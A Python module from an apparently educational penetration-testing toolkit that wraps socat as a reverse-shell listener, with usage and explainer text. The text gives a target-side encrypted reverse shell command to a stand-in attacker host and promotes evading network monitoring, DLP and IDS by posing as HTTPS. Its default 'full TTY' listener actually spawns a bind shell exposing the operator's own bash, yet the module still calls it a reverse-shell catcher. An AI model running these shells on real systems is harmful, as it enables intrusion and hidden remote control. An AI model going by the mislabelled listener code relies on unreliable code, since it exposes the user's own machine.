"""
Socat listener for catching reverse shells with advanced features
"""

import subprocess
import shutil
import os
import time
from typing import Optional
from learnshells.utils.logger import Logger


class SocatListener:
    """Socat-based reverse shell listener with advanced features."""
    
    def __init__(self, logger: Logger = None):
        """
        Initialize socat listener.
        
        Args:
            logger: Logger instance
        """
        self.logger = logger or Logger()
        self.process = None
        self.is_running = False
    
    def check_availability(self) -> bool:
        """
        Check if socat is available on system.
        
        Returns:
            bool: True if socat is available
        """
        if shutil.which('socat'):
            self.logger.success(
                "Found socat",
                explain="Socat is like netcat on steroids! It supports encryption, "
                       "better TTY handling, and more advanced features."
            )
            return True
        
        self.logger.error(
            "Socat not found!",
            explain="Socat is not installed. Install it with:\n"
                   "  Ubuntu/Debian: sudo apt install socat\n"
                   "  Kali: Already installed by default"
        )
        return False
    
    def start(
        self,
        port: int,
        interface: str = "0.0.0.0",
        use_ssl: bool = False,
        cert_file: Optional[str] = None,
        key_file: Optional[str] = None,
        verbose: bool = False
    ) -> bool:
        """
        Start socat listener.
        
        Args:
            port: Port to listen on
            interface: Interface to bind to
            use_ssl: Use SSL/TLS encryption
            cert_file: SSL certificate file
            key_file: SSL key file
            verbose: Verbose output
            
        Returns:
            bool: True if listener started successfully
        """
        if not self.check_availability():
            return False
        
        # Build socat command
        if use_ssl:
            if not cert_file or not key_file:
                self.logger.error("SSL mode requires cert_file and key_file")
                return False
            
            socat_args = [
                'socat',
                f'OPENSSL-LISTEN:{port},cert={cert_file},key={key_file},verify=0,fork',
                'STDOUT'
            ]
            self.logger.info(
                "Starting encrypted socat listener",
                explain="SSL/TLS encryption hides your shell traffic from network monitoring."
            )
        else:
            socat_args = [
                'socat',
                f'TCP-LISTEN:{port},reuseaddr,fork',
                'EXEC:/bin/bash,pty,stderr,setsid,sigint,sane'
            ]
        
        # Display listener info
        listener_type = "Socat (Encrypted)" if use_ssl else "Socat (Full TTY)"
        self.logger.listener_info(interface, port, listener_type)
        
        self.logger.info(f"Starting listener: {' '.join(socat_args)}")
        self.logger.separator()
        
        if self.logger.educational:
            self.logger.educational_note(
                "Socat Advantages",
                "Socat provides:\n"
                "• Full TTY support (no upgrade needed!)\n"
                "• SSL/TLS encryption support\n"
                "• Better signal handling (Ctrl+C works properly)\n"
                "• Automatic PTY allocation\n"
                "• More stable connections\n\n"
                "The shell you get is immediately interactive with full features!"
            )
        
        try:
            # Start listener
            self.process = subprocess.Popen(
                socat_args,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            self.is_running = True
            self.logger.success("Listener started! Waiting for connection...")
            
            # Wait for the process
            self.process.wait()
            
            return True
            
        except KeyboardInterrupt:
            self.logger.warning("\nListener interrupted by user")
            self.stop()
            return False
        except Exception as e:
            self.logger.error(f"Failed to start listener: {e}")
            return False
    
    def start_background(
        self,
        port: int,
        interface: str = "0.0.0.0"
    ) -> bool:
        """
        Start listener in background (non-blocking).
        
        Args:
            port: Port to listen on
            interface: Interface to bind to
            
        Returns:
            bool: True if started successfully
        """
        if not self.check_availability():
            return False
        
        socat_args = [
            'socat',
            f'TCP-LISTEN:{port},reuseaddr,fork',
            'EXEC:/bin/bash,pty,stderr,setsid,sigint,sane'
        ]
        
        try:
            self.process = subprocess.Popen(
                socat_args,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                preexec_fn=os.setpgrp
            )
            
            self.is_running = True
            self.logger.success(f"Background listener started on port {port}")
            
            time.sleep(0.5)
            
            if self.process.poll() is not None:
                self.logger.error("Listener failed to start")
                return False
            
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to start background listener: {e}")
            return False
    
    def stop(self):
        """Stop the running listener."""
        if self.process:
            try:
                self.process.terminate()
                self.process.wait(timeout=3)
                self.logger.info("Listener stopped")
            except subprocess.TimeoutExpired:
                self.process.kill()
                self.logger.warning("Listener forcefully killed")
            except Exception as e:
                self.logger.debug(f"Error stopping listener: {e}")
            finally:
                self.process = None
                self.is_running = False
    
    def is_alive(self) -> bool:
        """Check if listener is still running."""
        if not self.process:
            return False
        return self.process.poll() is None
    
    def get_command(self, port: int, use_ssl: bool = False) -> str:
        """
        Get the socat command string.
        
        Args:
            port: Port to listen on
            use_ssl: Use SSL encryption
            
        Returns:
            Command string
        """
        if use_ssl:
            return f"socat OPENSSL-LISTEN:{port},cert=cert.pem,key=key.pem,verify=0,fork STDOUT"
        else:
            return f"socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"
    
    def generate_ssl_cert(self, output_file: str = "cert.pem") -> bool:
        """
        Generate self-signed SSL certificate for encrypted shells.
        
        Args:
            output_file: Output file path for certificate
            
        Returns:
            bool: True if successful
        """
        self.logger.info("Generating self-signed SSL certificate...")
        
        try:
            cmd = [
                'openssl', 'req', '-newkey', 'rsa:2048', '-nodes',
                '-keyout', output_file, '-x509', '-days', '365',
                '-out', output_file, '-subj', '/CN=localhost'
            ]
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                self.logger.success(
                    f"SSL certificate generated: {output_file}",
                    explain="This certificate encrypts your reverse shell traffic, "
                           "making it harder to detect and intercept."
                )
                return True
            else:
                self.logger.error(f"Failed to generate certificate: {result.stderr}")
                return False
                
        except Exception as e:
            self.logger.error(f"Error generating certificate: {e}")
            return False
    
    def get_usage_instructions(self) -> str:
        """Get usage instructions for socat."""
        instructions = """
📋 SOCAT LISTENER USAGE:

Basic Command (Full TTY):
socat TCP-LISTEN:443,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

Encrypted Command (SSL/TLS):
socat OPENSSL-LISTEN:443,cert=cert.pem,key=key.pem,verify=0,fork STDOUT

Generate SSL Certificate:
openssl req -newkey rsa:2048 -nodes -keyout cert.pem -x509 -days 365 -out cert.pem

Flags Explained:
• TCP-LISTEN:PORT: Listen on TCP port
• reuseaddr: Allow address reuse (prevents "address in use" errors)
• fork: Handle multiple connections
• EXEC:/bin/bash: Execute bash shell
• pty: Allocate pseudo-terminal (full TTY)
• stderr: Redirect stderr
• setsid: Create new session
• sigint: Pass Ctrl+C to shell
• sane: Sane terminal settings

SOCAT vs NETCAT:

Advantages of Socat:
✓ Full TTY support immediately (no upgrade needed!)
✓ SSL/TLS encryption support
✓ Better signal handling (Ctrl+C works)
✓ Proper terminal sizing
✓ More stable connections
✓ Can handle multiple connections (fork)

When to Use Socat:
✓ When you need full TTY immediately
✓ When you want encrypted shells
✓ When stability is important
✓ When using text editors (vim, nano)
✓ For production-quality shells

Disadvantages:
✗ Not always installed by default
✗ More complex syntax
✗ Slightly larger memory footprint

Encrypted Reverse Shell:
On Attacker:
  socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0,fork STDOUT

On Target:
  socat OPENSSL:attacker-ip:443,verify=0 EXEC:/bin/bash

Benefits of Encryption:
• Traffic looks like HTTPS
• Harder to detect malicious commands
• Bypasses some DLP/monitoring
• IDS/IPS can't inspect payload

Troubleshooting:
• "Address already in use": Port taken, try different port or add reuseaddr
• "command not found": Install socat: sudo apt install socat
• SSL errors: Regenerate certificate or check cert path
• PTY issues: Ensure pty flag is present

Pro Tips:
• Socat shells don't need TTY upgrade!
• Use port 443 for encrypted shells (looks like HTTPS)
• The 'sane' flag ensures proper terminal behavior
• Fork allows reconnection if shell dies
"""
        return instructions
    
    def explain_socat(self) -> str:
        """Explain how socat works and its advantages."""
        explanation = """
🎓 SOCAT EXPLAINED:

What is Socat?
Socat (SOcket CAT) is a advanced relay tool that establishes
bidirectional data transfer between two endpoints. Think of it
as "netcat++" with many more features.

Why Socat for Reverse Shells?

1. Full TTY Support:
   Socat can allocate a pseudo-terminal (PTY) automatically.
   This means:
   • Tab completion works
   • Arrow keys work
   • Ctrl+C works properly
   • Text editors (vim, nano) work
   • No manual TTY upgrade needed!

2. Encryption Support:
   Socat supports SSL/TLS encryption natively.
   Your shell traffic is encrypted end-to-end.
   This is crucial for:
   • Evading network monitoring
   • Bypassing DLP (Data Loss Prevention)
   • Looking like legitimate HTTPS traffic

3. Signal Handling:
   The sigint flag properly handles Ctrl+C.
   Instead of killing the shell, it passes the signal
   to the command you're running in the shell.

4. Stability:
   Socat is more robust than netcat.
   Better error handling and connection management.

The PTY Magic:
When you use 'pty' in socat:
• Socat creates a pseudo-terminal
• The shell runs in this PTY
• You interact with the PTY
• It feels like a real SSH session!

Without PTY (netcat):
[You] → [Socket] → [Shell stdin/stdout]
Limited: No tab completion, no colors, arrow keys broken

With PTY (socat):
[You] → [Socket] → [PTY] → [Shell]
Full: Everything works like normal terminal!

Common Socat Patterns:

File Transfer:
sender:   socat TCP-LISTEN:4444,reuseaddr,fork FILE:/path/to/file
receiver: socat TCP:ip:4444 CREATE:/tmp/file

Port Forward:
socat TCP-LISTEN:8080,reuseaddr,fork TCP:target:80

Encrypted Listener:
socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0,fork EXEC:/bin/bash,pty,setsid,sane

When to Use What:
• Netcat: Quick tests, simple shells, available everywhere
• Socat: Production shells, need full TTY, want encryption
• Metasploit: Need advanced features, sessions, pivoting
"""
        return explanation
    
    def troubleshoot(self, port: int):
        """Help troubleshoot socat listener issues."""
        self.logger.header("Socat Listener Troubleshooting")
        
        issues = []
        
        # Check 1: Is socat installed?
        if not self.check_availability():
            issues.append((
                "Socat not installed",
                "Install socat: sudo apt install socat"
            ))
            return
        
        # Check 2: Is port available?
        import socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.bind(('', port))
            sock.close()
            self.logger.success(f"✓ Port {port} is available")
        except OSError:
            issues.append((
                f"Port {port} is already in use",
                "Use different port or kill process using it"
            ))
        
        # Check 3: OpenSSL for encrypted shells
        if not shutil.which('openssl'):
            self.logger.warning("⚠ OpenSSL not found (needed for encrypted shells)")
        else:
            self.logger.success("✓ OpenSSL is available")
        
        # Display issues
        if issues:
            self.logger.error("Found potential issues:")
            for issue, solution in issues:
                self.logger.list_item(f"{issue}")
                self.logger.list_item(f"  → Solution: {solution}", indent=1)
        else:
            self.logger.success("No obvious issues found!")
        
        self.logger.tip(
            "Socat provides immediate full TTY - no upgrade needed!\n"
            "  If you want encryption, generate a cert first:\n"
            "  openssl req -newkey rsa:2048 -nodes -keyout cert.pem -x509 -days 365 -out cert.pem"
        )
